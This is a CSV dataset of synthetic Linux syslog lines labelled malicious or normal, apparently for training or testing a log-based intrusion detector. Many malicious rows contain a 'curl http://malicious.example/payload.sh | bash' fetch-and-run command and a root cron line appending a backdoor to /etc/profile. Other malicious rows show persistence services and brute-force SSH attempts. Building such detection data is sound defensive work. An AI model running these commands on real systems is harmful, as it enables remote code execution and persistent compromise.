id,log_text,label
422,CRON[4480]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
423,kernel: [ 5270.24 ] Module loaded: suspicious_mod,malicious
424,sshd[9884]: Failed password for invalid user admin from 5.188.239.46 port 22 ssh2,malicious
425,sshd[5122]: Failed password for invalid user admin from 5.188.9.197 port 22 ssh2,malicious
426,bash[9172]: curl http://malicious.example/payload.sh | bash,malicious
427,sshd[7078]: Accepted publickey for user from 192.168.157.127 port 22 ssh2,normal
428,kernel: [ 9011.34 ] Module loaded: suspicious_mod,malicious
429,systemd[1]: Started Session 6907 of user root.,normal
430,systemd[1]: Started Session 7657 of user root.,normal
431,systemd[1]: Created malicious service persistence_7663.service,malicious
432,bash[1109]: curl http://malicious.example/payload.sh | bash,malicious
433,sshd[1798]: Failed password for invalid user admin from 5.188.190.81 port 22 ssh2,malicious
434,bash[5817]: curl http://malicious.example/payload.sh | bash,malicious
435,bash[9464]: curl http://malicious.example/payload.sh | bash,malicious
436,kernel: [ 1483.67 ] USB device plugged,normal
437,CRON[3772]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
438,networkd: DHCPv4 address assigned to eth0,normal
439,systemd[1]: Started Session 1916 of user root.,normal
440,kernel: [ 9366.48 ] Module loaded: suspicious_mod,malicious
441,sshd[4746]: Accepted publickey for user from 192.168.92.178 port 22 ssh2,normal
442,kernel: [ 1223.51 ] USB device plugged,normal
443,networkd: DHCPv4 address assigned to eth0,normal
444,bash[4367]: curl http://malicious.example/payload.sh | bash,malicious
445,networkd: DHCPv4 address assigned to eth0,normal
446,systemd[1]: Created malicious service persistence_3420.service,malicious
447,kernel: [ 6774.45 ] Module loaded: suspicious_mod,malicious
448,sshd[1377]: Failed password for invalid user admin from 5.188.140.176 port 22 ssh2,malicious
449,systemd[1]: Created malicious service persistence_5054.service,malicious
450,sshd[4199]: Failed password for invalid user admin from 5.188.235.51 port 22 ssh2,malicious
451,CRON[1719]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
452,systemd[1]: Created malicious service persistence_5294.service,malicious
453,kernel: [ 3878.36 ] USB device plugged,normal
454,systemd[1]: Created malicious service persistence_7203.service,malicious
455,kernel: [ 7395.95 ] USB device plugged,normal
456,CRON[9645]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
457,networkd: DHCPv4 address assigned to eth0,normal
458,kernel: [ 3886.13 ] USB device plugged,normal
459,sshd[2736]: Accepted publickey for user from 192.168.63.190 port 22 ssh2,normal
460,sshd[8725]: Failed password for invalid user admin from 5.188.196.177 port 22 ssh2,malicious
461,sshd[5418]: Accepted publickey for user from 192.168.77.105 port 22 ssh2,normal
462,bash[9457]: curl http://malicious.example/payload.sh | bash,malicious
463,systemd[1]: Created malicious service persistence_4859.service,malicious
464,sshd[7059]: Accepted publickey for user from 192.168.0.83 port 22 ssh2,normal
465,sshd[3113]: Failed password for invalid user admin from 5.188.105.81 port 22 ssh2,malicious
466,kernel: [ 7465.74 ] USB device plugged,normal
467,systemd[1]: Created malicious service persistence_1936.service,malicious
468,systemd[1]: Started Session 7652 of user root.,normal
469,systemd[1]: Created malicious service persistence_2857.service,malicious
470,sshd[4115]: Accepted publickey for user from 192.168.13.122 port 22 ssh2,normal
471,systemd[1]: Created malicious service persistence_1157.service,malicious
472,sshd[8647]: Failed password for invalid user admin from 5.188.12.198 port 22 ssh2,malicious
473,CRON[1690]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
474,kernel: [ 8630.13 ] USB device plugged,normal
475,CRON[9878]: (root) CMD (ls),normal
476,sshd[9339]: Accepted publickey for user from 192.168.63.22 port 22 ssh2,normal
477,sshd[3462]: Failed password for invalid user admin from 5.188.225.36 port 22 ssh2,malicious
478,systemd[1]: Created malicious service persistence_5402.service,malicious
479,systemd[1]: Created malicious service persistence_4626.service,malicious
480,systemd[1]: Created malicious service persistence_2813.service,malicious
481,CRON[5231]: (root) CMD (whoami),normal
482,systemd[1]: Created malicious service persistence_7227.service,malicious
483,bash[9766]: curl http://malicious.example/payload.sh | bash,malicious
484,CRON[9210]: (root) CMD (uptime),normal
485,systemd[1]: Created malicious service persistence_7897.service,malicious
486,systemd[1]: Created malicious service persistence_9024.service,malicious
487,kernel: [ 3142.98 ] USB device plugged,normal
488,kernel: [ 4079.96 ] USB device plugged,normal
489,kernel: [ 4835.99 ] USB device plugged,normal
490,networkd: DHCPv4 address assigned to eth0,normal
491,bash[7685]: curl http://malicious.example/payload.sh | bash,malicious
492,sshd[7973]: Failed password for invalid user admin from 5.188.198.66 port 22 ssh2,malicious
493,sshd[7405]: Failed password for invalid user admin from 5.188.69.190 port 22 ssh2,malicious
494,sshd[5740]: Accepted publickey for user from 192.168.0.185 port 22 ssh2,normal
495,systemd[1]: Started Session 7371 of user root.,normal
496,systemd[1]: Started Session 2667 of user root.,normal
497,kernel: [ 8385.34 ] Module loaded: suspicious_mod,malicious
498,systemd[1]: Created malicious service persistence_8510.service,malicious
499,sshd[9534]: Failed password for invalid user admin from 5.188.145.108 port 22 ssh2,malicious
500,sshd[7670]: Accepted publickey for user from 192.168.157.128 port 22 ssh2,normal
501,systemd[1]: Started Session 7004 of user root.,normal
502,CRON[3006]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
503,sshd[3326]: Failed password for invalid user admin from 5.188.196.64 port 22 ssh2,malicious
504,sshd[8785]: Accepted publickey for user from 192.168.83.96 port 22 ssh2,normal
505,systemd[1]: Created malicious service persistence_8581.service,malicious
506,CRON[8622]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
507,systemd[1]: Started Session 4267 of user root.,normal
508,systemd[1]: Started Session 9436 of user root.,normal
509,networkd: DHCPv4 address assigned to eth0,normal
510,CRON[7211]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
511,systemd[1]: Created malicious service persistence_6144.service,malicious
512,CRON[5522]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
513,CRON[1667]: (root) CMD (ls),normal
514,networkd: DHCPv4 address assigned to eth0,normal
515,CRON[3190]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
516,networkd: DHCPv4 address assigned to eth0,normal
517,systemd[1]: Created malicious service persistence_6308.service,malicious
518,kernel: [ 5847.77 ] USB device plugged,normal
519,kernel: [ 1722.03 ] USB device plugged,normal
520,systemd[1]: Started Session 7886 of user root.,normal
521,sshd[5363]: Accepted publickey for user from 192.168.129.28 port 22 ssh2,normal
522,systemd[1]: Created malicious service persistence_4254.service,malicious
523,sshd[2190]: Failed password for invalid user admin from 5.188.59.150 port 22 ssh2,malicious
524,CRON[8359]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
525,CRON[1176]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
526,systemd[1]: Started Session 9177 of user root.,normal
527,CRON[6297]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
528,CRON[7906]: (root) CMD (ls),normal
529,sshd[1094]: Failed password for invalid user admin from 5.188.242.171 port 22 ssh2,malicious
530,CRON[9140]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
531,kernel: [ 9274.97 ] USB device plugged,normal
532,systemd[1]: Started Session 5545 of user root.,normal
533,systemd[1]: Created malicious service persistence_9133.service,malicious
534,kernel: [ 1590.52 ] USB device plugged,normal
535,systemd[1]: Started Session 4677 of user root.,normal
536,sshd[2305]: Accepted publickey for user from 192.168.245.157 port 22 ssh2,normal
537,CRON[7693]: (root) CMD (pwd),normal
538,bash[8122]: curl http://malicious.example/payload.sh | bash,malicious
539,CRON[4701]: (root) CMD (whoami),normal
540,CRON[8230]: (root) CMD (ls),normal
541,bash[9953]: curl http://malicious.example/payload.sh | bash,malicious
542,bash[8985]: curl http://malicious.example/payload.sh | bash,malicious
543,CRON[1855]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
544,networkd: DHCPv4 address assigned to eth0,normal
545,kernel: [ 3624.91 ] USB device plugged,normal
546,networkd: DHCPv4 address assigned to eth0,normal
547,sshd[2091]: Accepted publickey for user from 192.168.25.129 port 22 ssh2,normal
548,kernel: [ 8320.18 ] USB device plugged,normal
549,sshd[7027]: Failed password for invalid user admin from 5.188.38.143 port 22 ssh2,malicious
550,systemd[1]: Started Session 5885 of user root.,normal
551,CRON[9558]: (root) CMD (ls),normal
552,sshd[2011]: Accepted publickey for user from 192.168.215.137 port 22 ssh2,normal
553,systemd[1]: Created malicious service persistence_4961.service,malicious
554,systemd[1]: Started Session 5559 of user root.,normal
555,systemd[1]: Started Session 6460 of user root.,normal
556,CRON[9289]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
557,CRON[1865]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
558,sshd[2875]: Failed password for invalid user admin from 5.188.250.152 port 22 ssh2,malicious
559,sshd[1245]: Accepted publickey for user from 192.168.244.129 port 22 ssh2,normal
560,systemd[1]: Created malicious service persistence_8352.service,malicious
561,CRON[1868]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
562,bash[2650]: curl http://malicious.example/payload.sh | bash,malicious
563,kernel: [ 9842.33 ] USB device plugged,normal
564,networkd: DHCPv4 address assigned to eth0,normal
565,systemd[1]: Created malicious service persistence_1358.service,malicious
566,systemd[1]: Started Session 8229 of user root.,normal
567,bash[9645]: curl http://malicious.example/payload.sh | bash,malicious
568,kernel: [ 7790.71 ] Module loaded: suspicious_mod,malicious
569,sshd[9067]: Accepted publickey for user from 192.168.26.56 port 22 ssh2,normal
570,kernel: [ 5690.19 ] Module loaded: suspicious_mod,malicious
571,systemd[1]: Started Session 4296 of user root.,normal
572,systemd[1]: Created malicious service persistence_1802.service,malicious
573,systemd[1]: Started Session 2161 of user root.,normal
574,systemd[1]: Started Session 7730 of user root.,normal
575,CRON[6807]: (root) CMD (pwd),normal
576,sshd[4821]: Accepted publickey for user from 192.168.246.149 port 22 ssh2,normal
577,systemd[1]: Created malicious service persistence_8165.service,malicious
578,networkd: DHCPv4 address assigned to eth0,normal
579,sshd[2548]: Accepted publickey for user from 192.168.160.25 port 22 ssh2,normal
580,systemd[1]: Created malicious service persistence_2868.service,malicious
581,systemd[1]: Started Session 7167 of user root.,normal
582,kernel: [ 3575.35 ] USB device plugged,normal
583,systemd[1]: Created malicious service persistence_3499.service,malicious
584,sshd[6343]: Failed password for invalid user admin from 5.188.155.241 port 22 ssh2,malicious
585,sshd[8504]: Failed password for invalid user admin from 5.188.101.51 port 22 ssh2,malicious
586,sshd[3037]: Failed password for invalid user admin from 5.188.130.37 port 22 ssh2,malicious
587,kernel: [ 5569.93 ] Module loaded: suspicious_mod,malicious
588,CRON[9490]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
589,bash[1978]: curl http://malicious.example/payload.sh | bash,malicious
590,bash[2457]: curl http://malicious.example/payload.sh | bash,malicious
591,networkd: DHCPv4 address assigned to eth0,normal
592,bash[9541]: curl http://malicious.example/payload.sh | bash,malicious
593,bash[6528]: curl http://malicious.example/payload.sh | bash,malicious
594,bash[7089]: curl http://malicious.example/payload.sh | bash,malicious
595,kernel: [ 205.39 ] USB device plugged,normal
596,systemd[1]: Started Session 2812 of user root.,normal
597,kernel: [ 1816.67 ] USB device plugged,normal
598,kernel: [ 9786.52 ] Module loaded: suspicious_mod,malicious
599,kernel: [ 7450.51 ] USB device plugged,normal
600,kernel: [ 6165.37 ] USB device plugged,normal
601,systemd[1]: Created malicious service persistence_5219.service,malicious
602,sshd[3568]: Accepted publickey for user from 192.168.171.153 port 22 ssh2,normal
603,CRON[7054]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
604,bash[7823]: curl http://malicious.example/payload.sh | bash,malicious
605,kernel: [ 6006.87 ] USB device plugged,normal
606,systemd[1]: Started Session 5257 of user root.,normal
607,kernel: [ 588.1 ] USB device plugged,normal
608,kernel: [ 6980.55 ] Module loaded: suspicious_mod,malicious
609,sshd[2438]: Accepted publickey for user from 192.168.244.124 port 22 ssh2,normal
610,bash[3771]: curl http://malicious.example/payload.sh | bash,malicious
611,kernel: [ 1644.63 ] Module loaded: suspicious_mod,malicious
612,CRON[7283]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
613,CRON[4721]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
614,sshd[7654]: Failed password for invalid user admin from 5.188.208.9 port 22 ssh2,malicious
615,sshd[8805]: Failed password for invalid user admin from 5.188.50.240 port 22 ssh2,malicious
616,networkd: DHCPv4 address assigned to eth0,normal
617,bash[2494]: curl http://malicious.example/payload.sh | bash,malicious
618,bash[6402]: curl http://malicious.example/payload.sh | bash,malicious
619,sshd[5241]: Failed password for invalid user admin from 5.188.96.135 port 22 ssh2,malicious
620,kernel: [ 8948.17 ] Module loaded: suspicious_mod,malicious
621,kernel: [ 8028.23 ] USB device plugged,normal
622,systemd[1]: Created malicious service persistence_7618.service,malicious
623,systemd[1]: Started Session 7565 of user root.,normal
624,bash[6233]: curl http://malicious.example/payload.sh | bash,malicious
625,sshd[3166]: Failed password for invalid user admin from 5.188.83.74 port 22 ssh2,malicious
626,CRON[3594]: (root) CMD (pwd),normal
627,bash[1478]: curl http://malicious.example/payload.sh | bash,malicious
628,sshd[2893]: Accepted publickey for user from 192.168.3.146 port 22 ssh2,normal
629,CRON[8212]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
630,CRON[1532]: (root) CMD (pwd),normal
631,bash[1660]: curl http://malicious.example/payload.sh | bash,malicious
632,bash[3558]: curl http://malicious.example/payload.sh | bash,malicious
633,CRON[2044]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
634,sshd[9019]: Failed password for invalid user admin from 5.188.25.11 port 22 ssh2,malicious
635,CRON[8724]: (root) CMD (uptime),normal
636,sshd[7427]: Failed password for invalid user admin from 5.188.99.61 port 22 ssh2,malicious
637,CRON[2479]: (root) CMD (uptime),normal
638,CRON[7489]: (root) CMD (uptime),normal
639,systemd[1]: Created malicious service persistence_6069.service,malicious
640,systemd[1]: Started Session 6843 of user root.,normal
641,systemd[1]: Started Session 4844 of user root.,normal
642,sshd[9298]: Accepted publickey for user from 192.168.198.2 port 22 ssh2,normal
643,systemd[1]: Started Session 8627 of user root.,normal
644,CRON[2795]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
645,kernel: [ 5900.36 ] Module loaded: suspicious_mod,malicious
646,kernel: [ 6411.1 ] Module loaded: suspicious_mod,malicious
647,CRON[8952]: (root) CMD (uptime),normal
648,systemd[1]: Started Session 9645 of user root.,normal
649,sshd[8859]: Failed password for invalid user admin from 5.188.148.220 port 22 ssh2,malicious
650,bash[5384]: curl http://malicious.example/payload.sh | bash,malicious
